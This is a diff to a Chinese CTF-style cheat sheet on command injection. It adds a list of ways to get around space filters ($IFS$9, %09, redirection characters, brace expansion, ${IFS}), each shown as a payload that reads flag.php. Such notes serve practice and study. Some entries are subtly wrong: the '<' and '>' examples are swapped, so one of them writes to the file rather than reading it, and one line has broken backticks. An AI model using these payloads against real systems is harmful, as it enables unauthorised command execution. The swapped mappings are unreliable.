@@ -114,6 +114,14 @@ tailf --- 用于实时监视文件内容变化的命令 类似于tail -f
 
 ### 空格的替代方式
 
-使用`IFS$9`、`%09`、`<`、`>`、`<>`、`{,}`、**`%20`(URL编码)**、`${ IFS}`、**`${IFS}`**来代替空格
+- `$IFS$9`=>`cat$IFS$9flag.php`
+- ``%09`=>`cat%09flag.php`
+- `<`=>`cat>flag.php`
+- `>`=>`cat<flag.php`
+- `<>`=>`cat<>flag.php`
+- `{,}`=>`{cat,flag.php}`
+- `%20`(URL编码)
+- `${ IFS}`=>`cat${ IFS}flag.php`
+- `${IFS}`=>`cat${IFS}flag.php`
 
 
